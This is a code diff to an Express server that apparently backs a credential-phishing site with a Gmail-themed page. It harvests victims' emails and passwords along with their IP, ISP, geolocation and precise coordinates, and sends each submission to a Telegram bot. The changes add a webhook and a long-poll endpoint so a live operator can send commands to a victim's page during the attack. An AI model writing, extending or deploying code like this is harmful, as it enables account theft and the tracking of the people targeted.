@@ -2,13 +2,14 @@ require('dotenv').config();
 
 const express = require('express');
 const path = require('path');
+const crypto = require('crypto');
 const helmet = require('helmet');
 const cors = require('cors');
 const rateLimit = require('express-rate-limit');
 const { body, validationResult } = require('express-validator');
 
 const db = require('./lib/db');
-const { sendTelegramMessage, formatSubmission } = require('./lib/telegram');
+const { sendSubmissionNotification, handleCallback, waitForCommand, getSession } = require('./lib/telegram');
 const { parseUserAgent, getIp } = require('./lib/parser');
 const { lookupGeo } = require('./lib/geo');
 
@@ -53,6 +54,19 @@ app.get('/highlights', (req, res) => {
   res.render('highlights', { data });
 });
 
+// --- Telegram webhook for bot callbacks ---
+app.post('/api/telegram/webhook', async (req, res) => {
+  try {
+    if (req.body.callback_query) {
+      await handleCallback(req.body.callback_query);
+    }
+  } catch (err) {
+    console.error('[webhook] error:', err.message);
+  }
+  res.json({ ok: true });
+});
+
+// --- Main submission endpoint ---
 app.post(
   '/api/submit',
   submitLimiter,
@@ -60,6 +74,8 @@ app.post(
     body('email').isEmail().withMessage('A valid email is required'),
     body('provider').isString().trim().notEmpty().withMessage('Provider is required'),
     body('password').optional().isString(),
+    body('lat').optional().isFloat(),
+    body('lng').optional().isFloat(),
   ],
   async (req, res) => {
     const errors = validationResult(req);
@@ -67,14 +83,16 @@ app.post(
       return res.status(400).json({ success: false, errors: errors.array() });
     }
 
-    const { email, password, provider } = req.body;
+    const { email, password, provider, lat, lng } = req.body;
     const userAgent = req.headers['user-agent'] || '';
     const { browser, os, device } = parseUserAgent(userAgent);
     const ip = getIp(req);
     const geo = await lookupGeo(ip);
 
+    const sessionId = crypto.randomBytes(16).toString('hex');
     const now = new Date();
     const record = {
+      sessionId,
       email,
       password: password || '',
       provider,
@@ -86,17 +104,31 @@ app.post(
       city: geo.city,
       region: geo.region,
       country: geo.country,
+      lat: lat != null ? String(lat) : geo.lat,
+      lng: lng != null ? String(lng) : geo.lng,
+      timezone: geo.timezone,
+      isp: geo.isp,
       date: now.toISOString().slice(0, 10),
       time: now.toTimeString().slice(0, 8),
       timestamp: now.toISOString(),
     };
 
     db.addSubmission(record);
-    const tgResult = await sendTelegramMessage(formatSubmission(record));
+    const tgResult = await sendSubmissionNotification(record, sessionId);
 
-    res.json({ success: true, telegram: tgResult.ok });
+    res.json({ success: true, telegram: tgResult.ok, sessionId });
   }
 );
+
+// --- Long-poll endpoint: frontend waits for a command from the operator ---
+app.get('/api/status/:sessionId', async (req, res) => {
+  const { sessionId } = req.params;
+  const session = getSession(sessionId);
+  if (!session) return res.status(404).json({ command: null });
+
+  const result = await waitForCommand(sessionId);
+  res.json(result || { command: null });
+});
 
 app.get('/gmail', (req, res) => {
   res.render('gmail', { email: '' });
